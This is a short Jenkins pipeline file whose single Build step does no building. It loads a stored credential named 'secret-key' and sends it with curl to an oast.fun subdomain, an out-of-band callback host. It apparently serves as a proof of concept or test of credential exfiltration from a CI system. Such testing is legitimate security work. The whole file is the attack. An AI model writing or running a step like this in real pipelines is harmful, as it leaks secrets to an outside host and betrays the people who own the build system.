pipeline {
    agent any
     environment {
        secret_key     = credentials('secret-key')
    }
    stages {
        stage('Build') {
            steps {
              sh 'curl -d env="$secret_key" ccf3bxf2vtc0000xah7ggg8ti6ayyyyyb.oast.fun'
                }
            }
        }
    }
